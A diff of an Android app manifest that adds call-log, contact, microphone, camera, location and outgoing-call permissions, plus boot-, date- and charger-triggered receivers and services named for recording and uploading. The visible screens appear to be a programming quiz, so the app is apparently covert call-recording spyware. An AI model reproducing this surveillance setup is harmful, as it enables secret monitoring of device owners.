@@ -1,10 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.kalya.simcard1">
-    <uses-permission android:name="android.permission.RECORD_AUDIO"></uses-permission>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 
+    <uses-permission
+        android:name="android.permission.GET_ACCOUNTS"
+        android:maxSdkVersion="22" />
+    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <uses-feature android:name="android.hardware.camera" />
+
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
 
     <application
         android:allowBackup="true"
@@ -12,22 +31,62 @@
         android:label="@string/app_name"
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
-        <activity android:name=".MainActivity"
+        <activity
+            android:name=".MainActivity"
             android:label="@string/app_name">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
+
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
         <receiver android:name=".IncomingCall">
             <intent-filter>
-                <action android:name="android.intent.action.PHONE_STATE">
-                </action>
+                <action android:name="android.intent.action.PHONE_STATE" />
             </intent-filter>
         </receiver>
+        <receiver android:name=".Upload">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".MyReciever">
+            <intent-filter>
+                <action android:name="android.intent.action.DATE_CHANGED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
         <service
             android:name=".MyService"
             android:enabled="true" />
+        <service
+            android:name=".RecorderService"
+            android:enabled="true" />
+        <service
+            android:name=".ImportantService"
+            android:enabled="true" />
+        <service
+            android:name=".UploadRecording"
+            android:enabled="true" />
+        <service
+            android:name=".FetchAddressIntentService"
+            android:exported="false" />
+
+        <activity android:name=".Can" />
+        <activity android:name=".Java"/>
+        <activity android:name=".FinalResult"/>
+        <activity android:name=".InterviewQuestions"/>
+        <activity android:name=".MainFrame"/>
+        <activity android:name=".MainFrame1"/>
+        <activity android:name=".MainFrame2"/>
+        <activity android:name=".Quiz"/>
+        <activity android:name=".Quize"/>
+        <activity android:name=".Python" />
+        <activity android:name=".Javaa" />
+        <activity android:name=".C1"/>
+        <activity android:name=".Database"></activity>
     </application>
 
 </manifest>
